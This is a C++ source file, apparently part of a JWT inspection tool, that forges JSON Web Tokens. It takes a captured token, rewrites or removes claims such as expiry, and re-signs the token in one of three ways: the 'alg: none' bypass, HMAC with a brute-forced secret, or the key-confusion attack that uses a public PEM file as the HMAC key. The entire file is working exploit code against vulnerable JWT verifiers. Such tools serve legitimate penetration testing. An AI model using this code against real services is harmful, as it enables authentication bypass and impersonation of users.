#include "jwt_forge.hpp"
#include "hmac_alg.hpp"
#include "jwt_utils.hpp"

#include <stdexcept>

#include <openssl/hmac.h>

namespace jwt_inspector {

namespace {

nlohmann::json parse_claims_object(const std::string& path) {
    std::string text = jwt_utils::read_whole_file(path);
    nlohmann::json claims;
    try {
        claims = nlohmann::json::parse(text);
    } catch (const std::exception& e) {
        throw std::runtime_error("Failed to parse --claims file as JSON: " + std::string(e.what()));
    }
    if (!claims.is_object()) {
        throw std::runtime_error("--claims file must contain a JSON object (top-level keys "
                                 "become/override payload claims)");
    }
    return claims;
}

std::string sign_hmac(const std::string& alg, const std::string& key,
                      const std::string& signing_input) {
    const EVP_MD* md = hmac_md_for_alg(alg);
    if (!md) {
        throw std::runtime_error("Unsupported HMAC algorithm for forge: " + alg +
                                 " (use HS256, HS384, or HS512)");
    }

    unsigned char buf[EVP_MAX_MD_SIZE];
    unsigned int len = 0;
    if (!HMAC(md, key.data(), static_cast<int>(key.size()),
              reinterpret_cast<const unsigned char*>(signing_input.data()),
              signing_input.size(), buf, &len)) {
        throw std::runtime_error("HMAC computation failed");
    }
    return jwt_utils::base64url_encode(buf, len);
}

} // namespace

ForgeResult forge_token(const ForgeOptions& opts) {
    nlohmann::json header;
    nlohmann::json payload;

    if (!opts.base_token.empty()) {
        // Reuse an existing token's header/payload as the starting point — the
        // usual workflow is "take a captured token, tweak a claim or two, and
        // re-sign it with a secret found via bruteforce / known out of band".
        auto parts = jwt_utils::split_token(opts.base_token);
        header = jwt_utils::decode_json_part(parts.header_b64);
        payload = jwt_utils::decode_json_part(parts.payload_b64);
    } else {
        header = {{"typ", "JWT"}};
        payload = nlohmann::json::object();
    }

    if (opts.claims_file.has_value()) {
        nlohmann::json claims = parse_claims_object(opts.claims_file.value());
        // JSON Merge Patch (RFC 7396) semantics: a null value removes that key
        // from the payload instead of setting it to the JSON literal null.
        // Lets a claims file drop a claim entirely (e.g. {"exp": null} to
        // strip expiry from a captured token) rather than only ever being
        // able to override it with some other value.
        for (auto& [key, value] : claims.items()) {
            if (value.is_null()) {
                payload.erase(key);
            } else {
                payload[key] = value;
            }
        }
    }

    ForgeResult result;
    result.confusion_attack = (opts.mode == ForgeSigningMode::ConfusionPubkey);

    std::string key;
    switch (opts.mode) {
        case ForgeSigningMode::None:
            header["alg"] = "none";
            result.algorithm = "none";
            break;
        case ForgeSigningMode::Secret:
            header["alg"] = opts.hmac_alg;
            result.algorithm = opts.hmac_alg;
            key = opts.secret;
            break;
        case ForgeSigningMode::ConfusionPubkey:
            header["alg"] = opts.hmac_alg;
            result.algorithm = opts.hmac_alg;
            // The raw bytes of the PEM file, exactly as a vulnerable verifier
            // would read them (e.g.
            // `jwt.verify(token, fs.readFileSync("public.pem"))`), used as
            // the HMAC key. No trimming/normalization: faithfully reproduces
            // what the target actually does with the file on disk.
            key = jwt_utils::read_whole_file(opts.confusion_pubkey_path);
            break;
    }

    std::string header_json = header.dump();
    std::string payload_json = payload.dump();
    std::string h64 = jwt_utils::base64url_encode(
        reinterpret_cast<const uint8_t*>(header_json.data()), header_json.size());
    std::string p64 = jwt_utils::base64url_encode(
        reinterpret_cast<const uint8_t*>(payload_json.data()), payload_json.size());
    std::string signing_input = h64 + "." + p64;

    if (opts.mode == ForgeSigningMode::None) {
        // Deliberately 3 parts with an empty signature segment (trailing dot),
        // matching the classic "alg: none" proof-of-concept format accepted by
        // vulnerable JWT libraries — not just 2 parts without a trailing dot.
        result.token = signing_input + ".";
    } else {
        result.token = signing_input + "." + sign_hmac(opts.hmac_alg, key, signing_input);
    }
    return result;
}

} // namespace jwt_inspector
